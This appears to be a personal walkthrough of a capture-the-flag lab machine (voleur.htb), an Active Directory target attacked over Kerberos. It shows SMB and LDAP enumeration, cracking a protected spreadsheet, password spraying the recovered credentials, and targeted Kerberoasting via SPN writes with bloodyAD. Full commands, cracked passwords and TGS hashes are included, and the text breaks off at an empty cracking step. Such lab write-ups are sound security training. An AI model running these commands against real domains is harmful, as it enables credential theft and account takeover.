# Initial credentials
```python
ryan.naylor:HollowOct31Nyt
```

# Host file setup
```python
sudo nxc smb 10.129.232.130 --generate-hosts-file /etc/hosts
[sudo] password for kali: 
SMB         10.129.232.130  445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False)
```
Some things to note:
- NTLM auth is disabled which means ill have to use kerberos auth
- SMB signing is enabled

# Enumeration
## Open ports
```python
nmap -p- --min-rate=2000 -sT dc.voleur.htb                  
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-06 12:45 -0400
Nmap scan report for dc.voleur.htb (10.129.232.130)
Host is up (0.014s latency).
rDNS record for 10.129.232.130: DC.voleur.htb
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
2222/tcp  open  EtherNetIP-1
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49668/tcp open  unknown
61568/tcp open  unknown
61569/tcp open  unknown
61570/tcp open  unknown
61599/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 66.78 seconds
```
## Nmap
```python
nmap -p 53,88,135,139,389,445,464,593,636,2222,3268,3269,5985,9389 -A --min-rate=2000 -sT dc.voleur.htb
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-06 12:47 -0400
Nmap scan report for dc.voleur.htb (10.129.232.130)
Host is up (0.015s latency).
rDNS record for 10.129.232.130: DC.voleur.htb

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-07 00:47:26Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
2222/tcp open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA)
|   256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 (ECDSA)
|_  256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf        .NET Message Framing
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel
```
DC is running at +8h

# SMB (445)
Since this does not allow NTLM auth ill have to use kerberos

```python
faketime -f +8h nxc smb dc.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\ryan.naylor:HollowOct31Nyt
```
I have successful authentication

```python
faketime -f +8h nxc smb dc.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k --shares
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
SMB         dc.voleur.htb   445    dc               [*] Enumerated shares
SMB         dc.voleur.htb   445    dc               Share           Permissions     Remark
SMB         dc.voleur.htb   445    dc               -----           -----------     ------
SMB         dc.voleur.htb   445    dc               ADMIN$                          Remote Admin
SMB         dc.voleur.htb   445    dc               C$                              Default share
SMB         dc.voleur.htb   445    dc               Finance                         
SMB         dc.voleur.htb   445    dc               HR                              
SMB         dc.voleur.htb   445    dc               IPC$            READ            Remote IPC
SMB         dc.voleur.htb   445    dc               IT              READ            
SMB         dc.voleur.htb   445    dc               NETLOGON        READ            Logon server share 
SMB         dc.voleur.htb   445    dc               SYSVOL          READ            Logon server share
```
Read perms on `IT`

```python
faketime -f +8h nxc smb dc.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k --users-export users.txt
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
SMB         dc.voleur.htb   445    dc               -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         dc.voleur.htb   445    dc               Administrator                 2025-01-28 20:35:13 0       Built-in account for administering the computer/domain
SMB         dc.voleur.htb   445    dc               Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         dc.voleur.htb   445    dc               krbtgt                        2025-01-29 08:43:06 0       Key Distribution Center Service Account
SMB         dc.voleur.htb   445    dc               ryan.naylor                   2025-01-29 09:26:46 0       First-Line Support Technician
SMB         dc.voleur.htb   445    dc               marie.bryant                  2025-01-29 09:21:07 0       First-Line Support Technician
SMB         dc.voleur.htb   445    dc               lacey.miller                  2025-01-29 09:20:10 0       Second-Line Support Technician
SMB         dc.voleur.htb   445    dc               svc_ldap                      2025-01-29 09:20:54 0        
SMB         dc.voleur.htb   445    dc               svc_backup                    2025-01-29 09:20:36 0        
SMB         dc.voleur.htb   445    dc               svc_iis                       2025-01-29 09:20:45 0        
SMB         dc.voleur.htb   445    dc               jeremy.combs                  2025-01-29 15:10:32 0       Third-Line Support Technician
SMB         dc.voleur.htb   445    dc               svc_winrm                     2025-01-31 09:10:12 0        
SMB         dc.voleur.htb   445    dc               [*] Enumerated 11 local users: VOLEUR
SMB         dc.voleur.htb   445    dc               [*] Writing 11 local users to users.txt
```
Dumped all the users to a userfile

Kerberoasting and as-rep roasting both failed

For ease of use ill generate a tgt for this user save typing the credentials

```python
faketime -f +8h nxc smb dc.voleur.htb -u ryan.naylor -p 'HollowOct31Nyt' -k --generate-tgt ryan_naylor 
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
SMB         dc.voleur.htb   445    dc               [+] TGT saved to: ryan_naylor.ccache
SMB         dc.voleur.htb   445    dc               [+] Run the following command to use the TGT: export KRB5CCNAME=ryan_naylor.ccache
```

# `IT` SMB share
```python
faketime -f +8h impacket-smbclient voleur.htb/ryan.naylor@dc.voleur.htb -k         
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[-] CCache file is not found. Skipping...
Type help for list of commands
# shares
ADMIN$
C$
Finance
HR
IPC$
IT
NETLOGON
SYSVOL
# use IT
# ls
drw-rw-rw-          0  Wed Jan 29 04:10:01 2025 .
drw-rw-rw-          0  Thu Jul 24 16:09:59 2025 ..
drw-rw-rw-          0  Wed Jan 29 04:40:17 2025 First-Line Support
# cd First-Line Support
# ls
drw-rw-rw-          0  Wed Jan 29 04:40:17 2025 .
drw-rw-rw-          0  Wed Jan 29 04:10:01 2025 ..
-rw-rw-rw-      16896  Thu May 29 18:23:36 2025 Access_Review.xlsx
# get Access_Review.xlsx
```
Ive downloaded a .xlsx file

It is password protected

```python
office2john Access_Review.xlsx | tee xlsx.hash
Access_Review.xlsx:$office$*2013*100000*256*16*a80811402788c037b50df976864b33f5*500bd7e833dffaa28772a49e987be35b*7ec993c47ef39a61e86f8273536decc7d525691345004092482f9fd59cfa111c
```
Ive generate a hash now ill try to crack it

```python
john xlsx.hash --wordlist=/usr/share/wordlists/rockyou.txt 
Created directory: /home/kali/.john
Using default input encoding: UTF-8
Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 256/256 AVX2 8x / SHA512 256/256 AVX2 4x AES])
Cost 1 (MS Office version) is 2013 for all loaded hashes
Cost 2 (iteration count) is 100000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
football1        (Access_Review.xlsx)     
1g 0:00:00:01 DONE (2026-04-06 13:07) 0.5524g/s 459.6p/s 459.6c/s 459.6C/s football1..legolas
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Ive cracked the hash!

# Hunting credentials
![](Pasted%20image%2020260406131010.png)

Few things from this file:
- Found two passwords
- Three users in the remote management group
- `todd.wolfe` may be a deleted account if i can re-enable it i know the password

```python
svc_ldap:M1XyC9pW7qT5Vn
svc_iis:N5pXyW1VqM7CZ8
todd.wolfe:NightT1meP1dg3on14
```

# Compromising `svc_ldap` and `svc_iis`
```python
faketime -f +8h nxc smb dc.voleur.htb -u users.txt -p 'M1XyC9pW7qT5Vn' --continue-on-success -k       
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\Administrator:M1XyC9pW7qT5Vn KDC_ERR_PREAUTH_FAILED 
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\Guest:M1XyC9pW7qT5Vn KDC_ERR_CLIENT_REVOKED 
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\krbtgt:M1XyC9pW7qT5Vn KDC_ERR_CLIENT_REVOKED 
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\ryan.naylor:M1XyC9pW7qT5Vn KDC_ERR_PREAUTH_FAILED 
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\marie.bryant:M1XyC9pW7qT5Vn KDC_ERR_PREAUTH_FAILED 
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\lacey.miller:M1XyC9pW7qT5Vn KDC_ERR_PREAUTH_FAILED 
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\svc_ldap:M1XyC9pW7qT5Vn 
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\svc_backup:M1XyC9pW7qT5Vn KDC_ERR_PREAUTH_FAILED 
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\svc_iis:M1XyC9pW7qT5Vn KDC_ERR_PREAUTH_FAILED 
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\jeremy.combs:M1XyC9pW7qT5Vn KDC_ERR_PREAUTH_FAILED 
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\svc_winrm:M1XyC9pW7qT5Vn KDC_ERR_PREAUTH_FAILED
```
`svc_ldap` compromised

```python
faketime -f +8h nxc smb dc.voleur.htb -u users.txt -p 'N5pXyW1VqM7CZ8' --continue-on-success -k
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\Administrator:N5pXyW1VqM7CZ8 KDC_ERR_PREAUTH_FAILED 
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\Guest:N5pXyW1VqM7CZ8 KDC_ERR_CLIENT_REVOKED 
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\krbtgt:N5pXyW1VqM7CZ8 KDC_ERR_CLIENT_REVOKED 
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\ryan.naylor:N5pXyW1VqM7CZ8 KDC_ERR_PREAUTH_FAILED 
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\marie.bryant:N5pXyW1VqM7CZ8 KDC_ERR_PREAUTH_FAILED 
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\lacey.miller:N5pXyW1VqM7CZ8 KDC_ERR_PREAUTH_FAILED 
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\svc_ldap:N5pXyW1VqM7CZ8 KDC_ERR_PREAUTH_FAILED 
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\svc_backup:N5pXyW1VqM7CZ8 KDC_ERR_PREAUTH_FAILED 
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\svc_iis:N5pXyW1VqM7CZ8 
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\jeremy.combs:N5pXyW1VqM7CZ8 KDC_ERR_PREAUTH_FAILED 
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\svc_winrm:N5pXyW1VqM7CZ8 KDC_ERR_PREAUTH_FAILED
```
`svc_iis` compromised

Both of these users have the same access on SMB

# Bloodhound
![](Pasted%20image%2020260406132102.png)
As seen here i have WriteSPN on `svc_winrm` and also GenericWrite on `lacey.miller` and the `second-line technicians` OU

After further inspection i see that its `lacey.miller` who is apart of the OU so ill just target lacey

# Targeted Kerberoast on `svc_winrm`
```python
faketime -f +8h bloodyAD -k --host dc.voleur.htb -d voleur.htb -u svc_ldap -p 'M1XyC9pW7qT5Vn' set object 'svc_winrm' servicePrincipalName -v 'service/hacked'

[+] svc_winrm's servicePrincipalName has been updated
```
First ill update the SPN

```python
faketime -f +8h nxc ldap dc.voleur.htb -u 'svc_ldap' -p 'M1XyC9pW7qT5Vn' --kerberoasting kerb.hashes -k
LDAP        dc.voleur.htb   389    DC               [*] None (name:DC) (domain:voleur.htb) (signing:None) (channel binding:No TLS cert) (NTLM:False)
LDAP        dc.voleur.htb   389    DC               [+] voleur.htb\svc_ldap:M1XyC9pW7qT5Vn 
LDAP        dc.voleur.htb   389    DC               [*] Skipping disabled account: krbtgt
LDAP        dc.voleur.htb   389    DC               [*] Total of records returned 1
LDAP        dc.voleur.htb   389    DC               [*] sAMAccountName: svc_winrm, memberOf: CN=Remote Management Users,CN=Builtin,DC=voleur,DC=htb, pwdLastSet: 2025-01-31 04:10:12.398769, lastLogon: 2025-01-29 10:07:32.711487
LDAP        dc.voleur.htb   389    DC               $krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb\svc_winrm*$7c6b1136982d2aeee10a5f29630e471b$b114accdfe288b8af62aba2519337f26871ed5209bde92f50d7b8f1d32bde18ed84904fee03b78251b7f1aa64a3744cb88439bd2099f3da93f7310fc15c51489e0e0aed68ff90e3019ac06d663c10580733d956942b8e7f93502caf527d74eb2f859bf23d2ad5555212a00ea49e10ea4553dc52c90d734d42535f8970be3c8f98a50e46c433798911a951055d52fcd284db26434436b0224ac761f5db39ab474da3677a3a0f1f25a591a45e459534d8f463d1a5c7b975816842325a3811d3874b864b16769582d35f095f654e8c2cd807d6b706926d91203fc1d9fa7ee242e5bb6b145bf1589748a46c1bb70ab91d90e49cd8d0e9e364eef6f908571a1ed7eedd8628f8ac7517e08a415940e51cdcfac3ad9c8a7287a790c4c8f790586af46140d71c03092bba41d9acd9f4e407bb5e9bc4962f030a43aafc18b236d8fff6b2e9ac858b10410615f9d8938c07f89a907fc6a530df8ab04584527739f273c6ea49e98b48edebb90defa07218edf1799db5bba25ed7fbb1bb94f48bec488fdb2bac334a416582e9dbcbd69fea11b262f72f2f2ddfd16472655cf0d05d30811c924ffad99e4a3ad91e6f53c0dff880157ec8745a0a97d38af6efb869bbfe578020426d56363db536aa1cf8ba536e5e2066919f144ef281dbb2e61f725ab09d634e154363eaf72916c1b17d50df03e996684f1d746b602ab15edbe48c8365ee541d8ae31851cb2901664ab292db30a82447b94f69b7513f9bddfe1cef51cffe897ec3808a369eb3e4d426b921b9e3a4bab628871488de24512aa69d3c211f5ed46cc995d8e3939ae9c12e85ab1e5969149621512388881781aab2731bfa891c848617fa3fea2077699063df0c6eb25cb3e6ac377e35c262859d3ea026ac24da3e68dade7430d294c1b3d02cdcf2dc494516e0f8f9d4ac063de5818bc7744efcbfcce71ed5d50fb226c4da583086b02957d3389ed424704b07b4ce38f47df8f92dd664bfac740495b6162a0db7e8fe9194b868b939dc8ef44c9738531e66926eaac96634b16b53308256a226bc292aba9502ce61b29ded7f5ac74fd6dce4cd13f4110f4e791095fc387589584e3ef7155af8900085158d8772a8281e673a38c5e680bc7ba3e38242fd8c9821ecb36ea97b225cb135d0217cfbb699ad8c0d57caa0731ca8ff4c3c25f807295f429e6934284046795df03094774fb2a47bb675acbc6c0035db4372ac9182f3f604c19599e97ab75516c89063f2731a2f791ec93920e6ac34d4ac156f35ad9f219511404f845e78e864ae596c7fccdbfee2ea52e38fd9283df7963d0d983acd4fb50f8b7f14611c2e463e9e4b9dc28094196c3e1145fb81d65fe7221b48e60227a579a8ac943911c1d74576133368d6e38ff9df1b4ac38f87ff74052f27ed406f2b78f7ddf4ad2d2f697b306ac716009c6d6508141d7e3a4f058a7f1d3bb5e8847df3b5fedb63e7a78fe
```
Ive dumped the hash

## Cracking the hash
```python
hashcat kerb.hashes /usr/share/wordlists/rockyou.txt

$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb\svc_winrm*$7c6b1136982d2aeee10a5f29630e471b$b114accdfe288b8af62aba2519337f26871ed5209bde92f50d7b8f1d32bde18ed84904fee03b78251b7f1aa64a3744cb88439bd2099f3da93f7310fc15c51489e0e0aed68ff90e3019ac06d663c10580733d956942b8e7f93502caf527d74eb2f859bf23d2ad5555212a00ea49e10ea4553dc52c90d734d42535f8970be3c8f98a50e46c433798911a951055d52fcd284db26434436b0224ac761f5db39ab474da3677a3a0f1f25a591a45e459534d8f463d1a5c7b975816842325a3811d3874b864b16769582d35f095f654e8c2cd807d6b706926d91203fc1d9fa7ee242e5bb6b145bf1589748a46c1bb70ab91d90e49cd8d0e9e364eef6f908571a1ed7eedd8628f8ac7517e08a415940e51cdcfac3ad9c8a7287a790c4c8f790586af46140d71c03092bba41d9acd9f4e407bb5e9bc4962f030a43aafc18b236d8fff6b2e9ac858b10410615f9d8938c07f89a907fc6a530df8ab04584527739f273c6ea49e98b48edebb90defa07218edf1799db5bba25ed7fbb1bb94f48bec488fdb2bac334a416582e9dbcbd69fea11b262f72f2f2ddfd16472655cf0d05d30811c924ffad99e4a3ad91e6f53c0dff880157ec8745a0a97d38af6efb869bbfe578020426d56363db536aa1cf8ba536e5e2066919f144ef281dbb2e61f725ab09d634e154363eaf72916c1b17d50df03e996684f1d746b602ab15edbe48c8365ee541d8ae31851cb2901664ab292db30a82447b94f69b7513f9bddfe1cef51cffe897ec3808a369eb3e4d426b921b9e3a4bab628871488de24512aa69d3c211f5ed46cc995d8e3939ae9c12e85ab1e5969149621512388881781aab2731bfa891c848617fa3fea2077699063df0c6eb25cb3e6ac377e35c262859d3ea026ac24da3e68dade7430d294c1b3d02cdcf2dc494516e0f8f9d4ac063de5818bc7744efcbfcce71ed5d50fb226c4da583086b02957d3389ed424704b07b4ce38f47df8f92dd664bfac740495b6162a0db7e8fe9194b868b939dc8ef44c9738531e66926eaac96634b16b53308256a226bc292aba9502ce61b29ded7f5ac74fd6dce4cd13f4110f4e791095fc387589584e3ef7155af8900085158d8772a8281e673a38c5e680bc7ba3e38242fd8c9821ecb36ea97b225cb135d0217cfbb699ad8c0d57caa0731ca8ff4c3c25f807295f429e6934284046795df03094774fb2a47bb675acbc6c0035db4372ac9182f3f604c19599e97ab75516c89063f2731a2f791ec93920e6ac34d4ac156f35ad9f219511404f845e78e864ae596c7fccdbfee2ea52e38fd9283df7963d0d983acd4fb50f8b7f14611c2e463e9e4b9dc28094196c3e1145fb81d65fe7221b48e60227a579a8ac943911c1d74576133368d6e38ff9df1b4ac38f87ff74052f27ed406f2b78f7ddf4ad2d2f697b306ac716009c6d6508141d7e3a4f058a7f1d3bb5e8847df3b5fedb63e7a78fe:AFireInsidedeOzarctica980219afi
```
I have cracked the hash

```python
svc_winrm:AFireInsidedeOzarctica980219afi
```
After getting access via winrm i need to step back i think the next step is by exploiting GenericWrite

Ill perform the same attack but on `lacey.miller` this time


# Targeted Kerberoast on `lacey.miller`

```python
faketime -f +8h bloodyAD -k --host dc.voleur.htb -d voleur.htb -u svc_ldap -p 'M1XyC9pW7qT5Vn' set object 'lacey.miller' servicePrincipalName -v 'http/hacked'   
[+] lacey.miller's servicePrincipalName has been updated
```
This updated the SPN

```python
faketime -f +8h nxc ldap dc.voleur.htb -u 'svc_ldap' -p 'M1XyC9pW7qT5Vn' --kerberoasting kerb.hashes2 -k
LDAP        dc.voleur.htb   389    DC               [*] None (name:DC) (domain:voleur.htb) (signing:None) (channel binding:No TLS cert) (NTLM:False)
LDAP        dc.voleur.htb   389    DC               [+] voleur.htb\svc_ldap:M1XyC9pW7qT5Vn 
LDAP        dc.voleur.htb   389    DC               [*] Skipping disabled account: krbtgt
LDAP        dc.voleur.htb   389    DC               [*] Total of records returned 2
LDAP        dc.voleur.htb   389    DC               [*] sAMAccountName: lacey.miller, memberOf: CN=Second-Line Technicians,DC=voleur,DC=htb, pwdLastSet: 2025-01-29 04:20:10.758901, lastLogon: <never>
LDAP        dc.voleur.htb   389    DC               $krb5tgs$23$*lacey.miller$VOLEUR.HTB$voleur.htb\lacey.miller*$2d086f3e824846534e1735888116da89$305cf7b38c126eaf94e85c6a8e3235445a034fbf54c377e173af51a24043d5c3abdd123eb9ffcbc2d0d30d10aba075f8e455e8716bcd9bb76b20a8797c1b43599db18e3a654ba596c1d49d5cc9ab3360ea62369234b86026d39e411d3aaf08307c86fe8af00e5dba6b2bf433349819ea16ace846aea3cef18a82f0f3dcbddd64df9a8e9b5010cbd34ccb51ed82557aa51816fdbc2b74cb41d11a403a4efed6b1a27ccee6b14eb780f3a88159459407bf742c3331a36f13e7c47b537b3753b295f860f075229bd7bc0e8bf25e2bb0cfd21ff7d5065f0726ad624524f3cd28a4511822e62964802307b697baa4cd288e5f488c120b24a0a60378946f775732b589f732abd5d82a722928b493cf5b0dcdcad9abdc88439c2bfb1a68acbb31e34788f5b6096d88c9d0ec8fdc03deb47db455d0d93e80926dda05ace531a753773a823d00c69259229a92dd5cbc74786c3f81bd5e2206563ab0544936f3f5168c645aedcdcc870ebd96b6abe9fc85b90131a3a2b08387dbbe2353ef71d03ddc37dd52f54eb3a666a793a39d7d8845793a01ee7abba170b65a91e0d3702e9ea4101e58b7c2d247389add23f4c26d5e7140e0521857ae8ea1cba67eaf0801ed4ab46039e11f630e1c9feba9affe45d2db82e6afb832a0c0c9a470d147e250de81f5a47a093259dae5f341a1f4e0962fc02f589a8e3026cf7f8abd4ab0d27959bfc8b8f9881e87f5a5e31cdf4901dc95ff2cc3671fca4e5e6c5db3a7a7723c1387336885921d73e00bcd01f1e944223e53d51fc1b23bfbf4e0d5d0287b1d65f9ef95bd6f8706cb49a87ee867e5acb4f3ccc07eda92e43d5d5bfebbf29f79ffec6811b34827f2ab516fa6cd619f6b1c3577586c5c0803d65972b39f95315e44881c8e8bacfc03a0d718b108189f60891ac7f3fe6b2ccbedfb529563453d88899653d4333c485f1cc421748ad60be89cb1307adff6d140f8191f1b4a777e2489288be6ef2dfe7c9c785e166c51069857b1892bbf8dd187d5c0261b5ab47a56731ff70181ccb0e4ef675f6183d7857d0127fa6a3fc150e9fddea4e2129dbf64c8c9773eceab5054f4541de9e24333ce6be9cf663a97b3f768229b077c38225f35362ee029cc98fbf60fa05817b0fa55e4bc12f458d066321cf3af7c62d08341163157b02eee052f0c7890d65efb9dfcaeca7db908cd8b6dc6f4865f6d05d33029223b06ee901152c4ba5173d14e069c56db51b073b757fce282407f343e810606d27b1c1eea054a1b1617e33f26a41718242b48bd6f96938e7f02889bf0f59206741994606feaae81c5af97304070830c1ef4770f933ddeaca266d43511757ccbddef72a64b5c13626ef528ab6f52810896604ad8fd4040cd38d00d090ced6400d48581b55d39e2c65ecdb724250005426f85dad584d074630950efb0ee47697ec51a66e61404e2af12a2efc22d0554345fc1491302d6861d
LDAP        dc.voleur.htb   389    DC               [*] sAMAccountName: svc_winrm, memberOf: CN=Remote Management Users,CN=Builtin,DC=voleur,DC=htb, pwdLastSet: 2025-01-31 04:10:12.398769, lastLogon: 2026-04-06 21:32:29.078537
LDAP        dc.voleur.htb   389    DC               $krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb\svc_winrm*$4d4913981ecb80db69ea03b2eca79eae$6434ff28390a710ec0113ab93023967966c0811239e61746c519831c2f2c57c19532ae5f4454e1dda6be4959939e3d1b8177a25e0e46a4942aff3f2f4f291116a1b920168907800c76fbb59c8012a4ff149d07abe33c1a8bb99f854f73af37cbc439fcfd6f241326e59d33de6644cb6a95d7713f71a1bd3a6fdc3d6ee7dcbe008d0a31980406ea43adaf4c42563e486e1a4bc63f8a1c4ed69ff95b4e994e68f5ed64004431ebb648d83ae300f88a2ec89a0752e8181a2452b8f68152f251715484677de67f78f70c143752e5c65dcbea7e40db591afe90e15ca8fb27686def5c77effa00ce443c7ae6744e2c805863f1e4dc03b2441b331f089d8cb7506809d1bdf369954217af5f822977cf82d7895cc96e8681d806a01f18b57fa77966f8a4ce451933a2a6a71d61adc6071cf3679228663ca265b02ac4d130a6624ed8090ae3c4e1c5b0ffa4a868e7cc9b20cc5b5b4c303043b38429ed8ae3ca6dc5e1caa04e184595686698403543eef9f3e76f993e214fbab0904baf42b58fa04f8595706cdc7094cc8f88f1ec5a8d149bdd525a93fb6a3d7ad4e0a82b606d03006c11ff1ccea0f3809f9d3e3d56af9e24a7c66192514b8babf348f505b1b40a81b6744b58118c4513ad14bc06a75a986258f30e756f2076e7f0912a57f636a9129503ea339ffe933ea554e0f31b9cdf53dea2d32f500944f5885666e9b7a06a42719684c2f752a7d89cb3a5c202ea6328298e9f8aa719f84fdd72d523ea5608efa41b9c36f95bcf640629a83b74d5983a8ca58fd31646f25903a7db38a58451e98d432e257fa7226f823e9d34f93f452deef6ab8f92d89dbf5e6f2764f11f3e14b44ab9683fc99f2a710a3512eb7e9300684e6e7940d9105624bb6e8bb7f1c64a9085602c60f056b2c13c5e6b88a5d2bae6da9d980591a236971800afa375845f7c196763d49505a53e4fd3842e8697c3b61c388e8d2ef1e9a9de2bd632de8b655d68c5a04f5d3f5beca8ee351143ffd49484aac01bb61a4c7a290522e7ac679013be0c1a105788929c0d63d18beb1e3eb1d04d45bb36693ea66b6838658447bcb51f9a7aed8b7f0fc074fde0005eec220f5d9610104d80efe6754f4398bbeded03252289c0b2e4385b71629c4940dfec5de35ce0d382d5d8040839eb9ed76f91a89fad732fdd79a0761a1b6ca4df7a1548e18e6e012072a873ac32fa0a3233777c8fdc97662a60866161ae485b6ded0a36a9ff387bca149f6ac3e15e0428d37d4143e850cf49b925d90dbd472944e87836f0a153a24f799ba30f7cbeedf2979bc70da91f6cd77975adaf57a87eda57b1a0911d49294ba15b3323733c2e899f0d11727b18ec9f412df08fed30fc6dbdd47deb21a2f368cf6c6a35cf6bcf1e642b7ead37d8893f5c2ae04e5745ea4893bd036821041db36913478f30228c1993ca8e781dba0e13e4f3b08c3b11e0c30ca98e3a9ab4ce85
```
I have `lacey.millers` hash now as well

## Cracking the hash
```python

```
